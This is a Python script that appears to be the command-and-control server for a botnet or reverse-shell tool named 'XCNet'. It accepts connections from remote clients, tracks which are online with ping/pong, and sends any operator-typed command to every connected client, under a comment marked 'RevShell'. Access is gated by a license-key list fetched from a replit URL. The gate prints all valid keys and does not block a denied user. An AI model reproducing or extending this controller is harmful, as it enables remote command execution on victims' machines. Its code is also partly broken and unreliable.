import threading
import time

import requests
import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

HOST = "127.0.0.1"
PORT = 65535

s.bind((HOST, PORT))

s.listen(5)

clients = []
online_clients = []

HELP_MENU = """
help  # Help menu
clear # Clear console
clients  # Client count
"""


def check_key(key):
    url = "https://replit.com/@rxyzqc/key/raw/keys.txt"
    r = requests.get(url)
    if r.status_code == 200:
        keys = r.text.split()
        print(keys)
        if key in keys:
            return True
    return False


key = input("Enter your key: ")
if check_key(key):
    print("Access Granted\n")
else:
    print("Access denied\n")


def handle_connections():
    while True:
        c, address = s.accept()

        clients.append(c)
        online_clients.append(c)


def ping():
    while True:
        for client in online_clients:
            try:
                client.send("ping".encode())
                r = client.recv(1024).decode()

                if r != "pong":
                    online_clients.remove(client)
            except Exception:
                online_clients.remove(client)

                time.sleep(1)


def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')


t1 = threading.Thread(target=handle_connections)
t1.start()

t2 = threading.Thread(target=ping)
t2.start()

username = os.getlogin()

while True:
    cmd = input(f"[{username}@XCNet]$ ")
    if cmd:
        # Help
        if cmd == "help":
            print(HELP_MENU)

        # Clear
        if cmd == "clear":
            clear()

        # Clients
        elif cmd == "clients":
            print("Total clients:", len(clients))
            print(f"Online clients: {len(online_clients)}\n")

        else:
            # RevShell
            for client in clients:
                client.sendall(cmd.encode())
